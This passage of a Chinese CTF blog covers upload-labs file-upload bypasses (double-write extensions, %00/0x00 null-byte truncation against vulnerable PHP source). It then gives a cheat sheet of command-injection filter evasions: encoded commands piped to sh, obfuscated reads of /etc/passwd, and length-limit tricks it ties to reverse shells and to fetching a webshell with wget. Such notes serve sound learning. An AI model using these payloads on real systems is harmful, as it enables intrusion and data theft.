<h2 id="level-11-双写绕过"><a href="#level-11-双写绕过" class="headerlink" title="level-11(双写绕过)"></a>level-11(双写绕过)</h2><h3 id="源码：-7"><a href="#源码：-7" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-9"><a href="#解答：-9" class="headerlink" title="解答："></a>解答：</h3><p>双写绕过</p>
<p>上传：<code>.pphphp</code>，进过黑名单过滤，会变成<code>.php</code></p>
<h2 id="level-12-白名单绕过之get型：-00"><a href="#level-12-白名单绕过之get型：-00" class="headerlink" title="level-12(白名单绕过之get型：%00)"></a>level-12(白名单绕过之get型：%00)</h2><h3 id="源码：-8"><a href="#源码：-8" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答:"></a>解答:</h3><p>此题对环境有特殊要求，目前无法复现，直接使用大佬的笔记内容</p>
<p>4月24日更新：复现完成。修改php.ini相应参数，已经PHP5.2.17</p>
<p>前提：该题需要magic_quotes_gpc=off、php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
<p>思路：因为$img_path是拼接而成，所以直接使用%00截断后面的内容，因此，先上传xx.jpg，再使用bp截断</p>
<p><img src="https://i.loli.net/2021/04/23/r5EIyFl9zkPgt84.png" alt="img"></p>
<h2 id="level-13-白名单绕过之post型：0x00"><a href="#level-13-白名单绕过之post型：0x00" class="headerlink" title="level-13(白名单绕过之post型：0x00)"></a>level-13(白名单绕过之post型：0x00)</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码:"></a>源码:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答：-10"><a href="#解答：-10" class="headerlink" title="解答："></a>解答：</h3><p>依旧是白名单绕过。post型，hex中0x00绕过。</p>
<p><img src="https://i.loli.net/2021/04/24/dknpOMe8iFHLTSl.png" alt="image-20210424110054827"></p>
<p>在hex中，找到<code>1.php</code>对应的十六进制数值，70、68、70，在70后插入一个字节 00 </p>
<p>直接访问阶段前的php文件即可。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF命令执行技巧总结</title>
    <url>/2021/04/21/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="CTF命令执行技巧总结"><a href="#CTF命令执行技巧总结" class="headerlink" title="CTF命令执行技巧总结"></a>CTF命令执行技巧总结</h1><p>对于近期CTF中命令执行的学习总结</p>
<span id="more"></span>
<h2 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h2><p>命令执行需要执行，贴出大佬关于代码执行和系统命令执行的讲解，不详细展开。</p>
<blockquote>
<p><a href="[https://wh0ale.github.io/2019/01/13/2019-1-13-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/](https://wh0ale.github.io/2019/01/13/2019-1-13-命令执行/">wh0ale博客：命令执行漏洞进阶详解</a>)</p>
</blockquote>
<h2 id="Linux绕过姿势"><a href="#Linux绕过姿势" class="headerlink" title="Linux绕过姿势"></a>Linux绕过姿势</h2><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09 &#x2F;&#x2F;php环境下</span><br></pre></td></tr></table></figure>
<h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;who</span><br><span class="line">b&#x3D;ami</span><br><span class="line">$a$b &#x2F;&#x2F;输出whoami</span><br><span class="line">q&#x3D;l; w&#x3D;s; e&#x3D;&quot; -al&quot;; $q$w$e   &#x2F;&#x2F;执行ls -al命令</span><br><span class="line">a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag; $a$b $c$d    &#x2F;&#x2F;cat flag</span><br></pre></td></tr></table></figure>
<h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;执行命令 cat flag</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">cat f*</span><br><span class="line">cat fl[abc]g         &#x2F;&#x2F;匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag         &#x2F;&#x2F;匹配a-z范围的任何字符</span><br><span class="line">利用正则:比如要读取etc&#x2F;passwd</span><br><span class="line">cat &#x2F;???&#x2F;??????</span><br><span class="line">cat &#x2F;???&#x2F;pass*</span><br><span class="line">cat &#x2F;etc$u&#x2F;passwd    &#x2F;&#x2F;变量u未定义，则为空</span><br></pre></td></tr></table></figure>
<h3 id="新姿势：Linux环境变量"><a href="#新姿势：Linux环境变量" class="headerlink" title="新姿势：Linux环境变量"></a>新姿势：Linux环境变量</h3><p>翻大佬博客时发现的姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;            #&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">echo $&#123;PATH:1:9&#125;        #&#x2F;usr&#x2F;local</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;  #拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/04/21/61yI4XiGgHPhTBf.png" alt="image-20210421181825782"></p>
<h3 id="绕过ban位-常规操作"><a href="#绕过ban位-常规操作" class="headerlink" title="绕过ban位(常规操作)"></a>绕过ban位(常规操作)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wh\o\ami    &#x2F;&#x2F;反斜线绕过</span><br><span class="line">who&quot;a&quot;mi    &#x2F;&#x2F;双引号绕过</span><br><span class="line">whoa&#39;m&#39;i    &#x2F;&#x2F;单引号绕过</span><br><span class="line">whoam&#96;&#96;i    &#x2F;&#x2F;反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh                 &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash               &#x2F;&#x2F;base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">&#96;echo d2hvYW1p|base64 -d&#96;                  &#x2F;&#x2F;将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash       &#x2F;&#x2F;hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;&#x3D;10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    </span><br><span class="line">&#x2F;&#x2F;在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami        &#x2F;&#x2F;不带中括号只能用一个字符在$后面</span><br><span class="line">who$@ami	</span><br><span class="line">whoa$*mi</span><br><span class="line">whoa$&#123;66&#125;mi     &#x2F;&#x2F;带中括号能用任意字符，但是字符内必须相同</span><br><span class="line">whoa$&#123;hh&#125;mi     &#x2F;&#x2F;不能带符号，会被解析成奇怪的东西</span><br></pre></td></tr></table></figure>
<p>正则 (假设/bin/cat: test: 是一个目录)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br><span class="line">&#x2F;???&#x2F;?at ????</span><br><span class="line">&#x2F;???&#x2F;?[a]&#39;&#39;[t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>$1、$2等和$@</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$#   &#x2F;&#x2F;是传给脚本的参数个数</span><br><span class="line">$0   &#x2F;&#x2F;是脚本本身的名字</span><br><span class="line">$1   &#x2F;&#x2F;是传递给该shell脚本的第一个参数</span><br><span class="line">$2   &#x2F;&#x2F;是传递给该shell脚本的第二个参数</span><br><span class="line">$@   &#x2F;&#x2F;是传给脚本的所有参数的列表</span><br><span class="line">$*   &#x2F;&#x2F;是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$   &#x2F;&#x2F;是脚本运行的当前进程ID号</span><br><span class="line">$?   &#x2F;&#x2F;是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
<h3 id="绕过ban位之cat"><a href="#绕过ban位之cat" class="headerlink" title="绕过ban位之cat"></a>绕过ban位之cat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</span><br><span class="line">grep test *file</span><br><span class="line">示例：grep &#123; *???    &#x2F;&#x2F;读flag.php</span><br></pre></td></tr></table></figure>
<h3 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666&#96;whoami&#96;666      &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">666&#96;\whoami&#96;666     &#x2F;&#x2F;bash: 666root666: command not found</span><br><span class="line">&#x2F;&#x2F;命令执行后的结果在2个666中间</span><br><span class="line"></span><br><span class="line">w&#96;f1hgb&#96;ho&#96;f1hgb&#96;am&#96;f1hgb&#96;i     &#x2F;&#x2F;反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w&#96;\f1hgb&#96;ho&#96;\f1hgb&#96;am&#96;\f1hgb&#96;i  &#x2F;&#x2F;这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi          &#x2F;&#x2F;和上面的差不多,都说执行和拼接    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="命令执行函数绕过（以system为例）"><a href="#命令执行函数绕过（以system为例）" class="headerlink" title="命令执行函数绕过（以system为例）"></a>命令执行函数绕过（以system为例）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">&lt;&#x3D;&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;system&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br><span class="line">&lt;&#x3D;&gt;</span><br><span class="line">&quot;(sy.&#x2F;*fthgb666*&#x2F;(st)&#x2F;*fthgb666*&#x2F;.em)&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</span><br></pre></td></tr></table></figure>
<h3 id="简单地绕过长度限制"><a href="#简单地绕过长度限制" class="headerlink" title="简单地绕过长度限制"></a>简单地绕过长度限制</h3><h4 id="Linux中的-gt-符号和-gt-gt-符号"><a href="#Linux中的-gt-符号和-gt-gt-符号" class="headerlink" title="Linux中的&gt;符号和&gt;&gt;符号"></a>Linux中的&gt;符号和&gt;&gt;符号</h4><p>(1)通过<code>&gt;</code>来创建文件</p>
<p>(2)通过<code>&gt;</code>将命令结果存入文件中<br>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建该文件再存入</p>
<h4 id="Linux中命令换行"><a href="#Linux中命令换行" class="headerlink" title="Linux中命令换行"></a>Linux中命令换行</h4><p>在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加<code>\</code>，可以将一条命令写在多行<br>比如一条命令<code>cat flag</code>可以如下表示</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">ca</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">t</span>\</span></span><br><span class="line"><span class="function">&gt;  <span class="title">fl</span>\</span></span><br><span class="line"><span class="function">&gt; <span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>既然可以这样那我们是不是可以在某些限制长度的情况下执行命令，将命令一条一条输入一个文本中再执行，尝试一下</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">echo</span> &quot;<span class="title">ca</span>\\&quot;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">t</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot; <span class="title">fl</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">ag</span>&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">cat</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">ca</span>\</span></span><br><span class="line"><span class="function"><span class="title">t</span>\</span></span><br><span class="line"><span class="function"> <span class="title">fl</span>\</span></span><br><span class="line"><span class="function"><span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">sh</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>用这种方法可以绕过一些长度限制读取文件内容</p>
<h3 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3><p>在<code>linux</code>中，我们使用<code>ls -t</code>命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function"><span class="title">c</span>  <span class="title">b</span>  <span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>我们来看看<code>ls -t&gt;ghtwf01</code>有什么效果(开始不存在<code>ghtwf01</code>这个文件)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span>&gt;<span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">cat</span> <span class="title">ghtwf01</span> </span></span><br><span class="line"><span class="function"><span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>这条命令先执行了创建<code>ghtwf01</code>文件然后将<code>ls -t</code>的执行结果写入<code>ghtwf01</code>文件<br>我们试试用这些方法来执行命令<code>cat flag</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># &gt; &quot;<span class="title">ag</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">fl</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">t</span> \\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">ca</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function">&#x27;<span class="title">ca</span>\&#x27;  &#x27;<span class="title">t</span> \&#x27;  &#x27;<span class="title">fl</span>\&#x27;   <span class="title">ag</span>   <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span> &gt; <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">sh</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 1: <span class="title">a</span>: <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 6: <span class="title">flag</span>: <span class="title">not</span> <span class="title">found</span></span></span><br></pre></td></tr></table></figure>
<p>读取到了<code>flag</code>内容为<code>this is your flag</code>，无论这个文件里面有不有其它内容都能执行<br>总而言之文件构造绕过就是如下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">linux下可以用 <span class="number">1</span>&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
<p>反弹<code>shell</code>命令比较长就可以用这种方式去绕过长度限制<br>如果服务器能连外网还可以使用命令<code>wget 网址 -O shell.php</code>去执行我们自己<code>vps</code>上面的木马文件</p>
<h3 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h3><p>我学了，啥都看不懂，有什么好说的。</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
